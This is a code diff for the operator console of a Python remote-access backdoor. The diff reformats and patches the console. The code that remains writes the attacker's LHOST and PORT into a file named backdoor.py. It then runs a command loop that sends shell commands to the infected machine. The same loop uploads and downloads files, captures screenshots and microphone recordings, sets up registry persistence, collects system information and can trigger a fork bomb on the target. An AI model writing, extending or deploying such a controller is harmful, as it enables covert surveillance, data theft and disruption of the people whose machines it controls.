@@ -4,7 +4,6 @@ import json
 import os
 import socket
 import sys
-
 import termcolor
 
 # main veriables
@@ -31,7 +30,7 @@ def modify_backdoor():
     file = open('backdoor.py')
     _content = file.readlines()
     for i, line in enumerate(fileinput.input('backdoor.py', inplace=1)):
-        sys.stdout.write(line.replace(_content[16], f'LHOST = "{LHOST}";PORT = {PORT}\n'))
+        sys.stdout.write(line.replace(_content[17], f'LHOST = "{LHOST}";PORT = {PORT}\n'))
     print(termcolor.colored("[+] Modifying backdoor file", 'green'))
 
 
@@ -63,23 +62,22 @@ def download_file(file_name):
         f.write(chunk)
         try:
             chunk = target.recv(1024)
-        except socket.timeout as e:
+        except socket.timeout:
             break
     target.settimeout(None)
     f.close()
 
 
-
 def target_reqs():
-   count=0
-   while True:
-      cmd = input(termcolor.colored('* Shell~%s: ' % str(ip), 'red'))
-      reliable_send(cmd)
-      if cmd == 'exit':
-         print(termcolor.colored('[-] Goodbye', 'red'))
-         break
-      elif cmd == 'help':
-          print(termcolor.colored("""
+    count = 0
+    while True:
+        cmd = input(termcolor.colored('* Shell~%s: ' % str(ip), 'red'))
+        reliable_send(cmd)
+        if cmd == 'exit':
+            print(termcolor.colored('[-] Goodbye', 'red'))
+            break
+        elif cmd == 'help':
+            print(termcolor.colored("""
          exit                                   # Exit Session With The Target
          clear                                  # Clear The Screen
          screenshot                             # Take a Screenshot of The Target Machine
@@ -92,74 +90,77 @@ def target_reqs():
          download *File name*                   # Download File From The Target Machine
          persistence *RegName* *FileName*       # Create Persistence In Registry, Note Working On Windows Only
          """, 'blue'))
-      elif cmd == 'clear':
-         os.system('clear')
-      elif cmd[:3] == 'cd ':
-         print(reliable_recv())
-      elif cmd[:6] == 'upload':
-          try:
-              upload_file(cmd[7:])
-              print(termcolor.colored('[+] Done Uploaded file', 'green'))
-              pass
-          except FileNotFoundError:
-              pass
-      elif cmd[:8] == 'download':
-          try:
-              download_file(cmd[9:])
-              print(termcolor.colored('[+] Done Downloaded file', 'green'))
-          except FileNotFoundError:
-              pass
-      elif cmd == 'screenshot':
-          f = open('screenshot%d.png' % (count), 'wb')
-          target.settimeout(10)
-          chunk = target.recv(1024)
-          while chunk:
-              f.write(chunk)
-              try:
-                  chunk = target.recv(1024)
-              except socket.timeout as e:
-                  break
-          target.settimeout(None)
-          f.close()
-          os.replace("screenshot%d.png" % (count), "images/screenshot%d.png" % (count))
-          count += 1
-          print(termcolor.colored('[+] Done screenshot saved', 'green'))
-      elif cmd[:6] == 'record':
-          f = open('recorded%d.wav' % (count), 'wb')
-          _timeout = int(cmd[7:]) + 7
-          target.settimeout(_timeout)
-          chunk = target.recv(1024)
-          while chunk:
-              f.write(chunk)
-              try:
-                  chunk = target.recv(1024)
-              except socket.timeout as e:
-                  break
-          target.settimeout(None)
-          f.close()
-          os.replace("recorded%d.wav" % (count), "recordings/recorded%d.wav" % (count))
-          count += 1
-          print(termcolor.colored('[+] Done recorded file', 'green'))
-      # TODO addming record screen function
+        elif cmd == 'clear':
+            os.system('clear')
+        elif cmd[:3] == 'cd ':
+            print(reliable_recv())
+        elif cmd[:6] == 'upload':
+            try:
+                upload_file(cmd[7:])
+                print(termcolor.colored('[+] Done Uploaded file', 'green'))
+                pass
+            except FileNotFoundError:
+                pass
+        elif cmd[:8] == 'download':
+            try:
+                download_file(cmd[9:])
+                print(termcolor.colored('[+] Done Downloaded file', 'green'))
+            except FileNotFoundError:
+                pass
+        elif cmd == 'screenshot':
+            f = open('screenshot%d.png' % count, 'wb')
+            target.settimeout(10)
+            chunk = target.recv(1024)
+            while chunk:
+                f.write(chunk)
+                try:
+                    chunk = target.recv(1024)
+                except socket.timeout:
+                    break
+            target.settimeout(None)
+            f.close()
+            os.replace("screenshot%d.png" % count, "images/screenshot%d.png" % count)
+            count += 1
+            print(termcolor.colored('[+] Done screenshot saved', 'green'))
+        elif cmd[:6] == 'record':
+            f = open('recorded%d.wav' % count, 'wb')
+            _timeout = int(cmd[7:]) + 7
+            target.settimeout(_timeout)
+            chunk = target.recv(1024)
+            while chunk:
+                f.write(chunk)
+                try:
+                    chunk = target.recv(1024)
+                except socket.timeout:
+                    break
+            target.settimeout(None)
+            f.close()
+            os.replace("recorded%d.wav" % count, "recordings/recorded%d.wav" % count)
+            count += 1
+            print(termcolor.colored('[+] Done recorded file', 'green'))
+        # TODO adding record screen function
 
-      elif cmd[:13] == 'screen_record':
-          if cmd[14:] == 'on':
-            print(termcolor.colored('[+] Go to http://yourip/:5000', 'green'))
-          if cmd[14:] == 'off':
-            print(termcolor.colored('[+] Done', 'green'))
-      elif cmd[:11] == 'persistence':
-          log = reliable_recv()
-          print(log)
-          pass
-      elif cmd == "sysinfo":
-          log = reliable_recv()
-          print(log)
-      elif cmd == "forkbomb":
-          res = reliable_recv()
-          print(res)
-      else:
-         result = reliable_recv()
-         print(result)
+        elif cmd[:13] == 'screen_record':
+            if cmd[14:] == 'on':
+                print(termcolor.colored('[+] Go to http://*target ip*/:5000', 'green'))
+            elif cmd[14:] == 'off':
+                print(termcolor.colored('[+] Done', 'green'))
+            else:
+                print(termcolor.colored('[-] Wrong command', 'red'))
+
+        elif cmd[:11] == 'persistence':
+            log = reliable_recv()
+            print(log)
+            pass
+        elif cmd == "sysinfo":
+            log = reliable_recv()
+            print(log)
+        elif cmd == "forkbomb":
+            res = reliable_recv()
+            print(res)
+        else:
+            result = reliable_recv()
+            print(result)
 
 
 modify_backdoor()
